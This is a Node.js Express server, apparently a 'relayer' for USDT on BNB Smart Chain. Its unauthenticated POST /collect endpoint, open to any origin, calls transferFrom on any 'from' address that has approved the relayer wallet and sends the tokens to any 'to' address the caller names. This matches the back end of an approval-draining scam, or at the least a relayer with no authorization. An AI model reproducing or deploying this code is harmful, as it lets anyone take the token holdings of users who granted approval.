import express from "express";
import cors from "cors";
import { ethers } from "ethers";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

/* ================= CONFIG ================= */

const PORT = process.env.PORT || 10000;
const RPC_URL =
  process.env.RPC_URL || "https://bsc-dataseed.binance.org/";

const USDT_ADDRESS =
  process.env.USDT ||
  "0x55d398326f99059fF775485246999027B3197955";

/* ================= PROVIDER ================= */

const provider = new ethers.JsonRpcProvider(RPC_URL);

/* ================= PRIVATE KEY FIX ================= */

const PRIVATE_KEY = process.env.PRIVATE_KEY?.trim();

if (!PRIVATE_KEY) {
  throw new Error("❌ PRIVATE_KEY missing in ENV");
}

if (!/^0x[a-fA-F0-9]{64}$/.test(PRIVATE_KEY)) {
  throw new Error(
    "❌ PRIVATE_KEY invalid format (must be 0x + 64 hex chars)"
  );
}

const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

console.log("✅ Relayer Wallet:", wallet.address);

/* ================= ERC20 ABI ================= */

const ERC20_ABI = [
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function transferFrom(address,address,uint256) returns (bool)"
];

const token = new ethers.Contract(
  USDT_ADDRESS,
  ERC20_ABI,
  wallet
);

/* ================= HEALTH CHECK ================= */

app.get("/", (_, res) => {
  res.send("✅ BSC Relayer Running");
});

/* ================= COLLECT ENDPOINT ================= */

app.post("/collect", async (req, res) => {
  try {
    const { from, to, amount } = req.body;

    console.log("Incoming:", req.body);

    if (!from || !to || !amount) {
      return res.status(400).json({
        error: "Missing parameters"
      });
    }

    const value = BigInt(amount);

    /* ---- CHECK BALANCE ---- */
    const balance = await token.balanceOf(from);

    console.log("User balance:", balance.toString());

    if (balance < value) {
      return res.status(400).json({
        error: "User balance too low"
      });
    }

    /* ---- CHECK ALLOWANCE ---- */
    const allowance = await token.allowance(from, wallet.address);

    console.log("Allowance:", allowance.toString());

    if (allowance < value) {
      return res.status(400).json({
        error: "Allowance not approved"
      });
    }

    /* ---- EXECUTE TRANSFER ---- */
    console.log("Sending transferFrom...");

    const tx = await token.transferFrom(from, to, value);

    console.log("TX Sent:", tx.hash);

    const receipt = await tx.wait();

    console.log("✅ SUCCESS:", receipt.hash);

    res.json({
      success: true,
      hash: receipt.hash
    });
  } catch (err) {
    console.error("❌ RELAYER ERROR:", err);

    res.status(500).json({
      error: err.reason || err.message
    });
  }
});

/* ================= START SERVER ================= */

app.listen(PORT, () => {
  console.log(`🚀 Server running on ${PORT}`);
});
